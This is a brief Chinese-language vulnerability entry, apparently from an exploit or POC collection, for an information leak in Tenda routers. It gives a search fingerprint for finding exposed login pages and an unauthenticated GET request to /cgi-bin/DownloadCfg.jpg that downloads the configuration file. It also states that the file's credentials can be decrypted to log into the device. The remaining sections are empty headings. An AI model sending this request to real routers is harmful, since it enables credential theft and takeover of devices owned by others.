# Tenda路由器DownloadCfg信息泄露漏洞

- **系统**：Tenda　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="Tenda | LOGIN"`
- **请求**：`GET /cgi-bin/DownloadCfg.jpg HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: lang=cn,en`

**请求体 / payload**
```

从配置文件中可找到系统账号密码\

解密后成功登录系统\

```

**其他**
- Tenda 路由器 DownloadCfg 信息泄露漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Tenda 路由器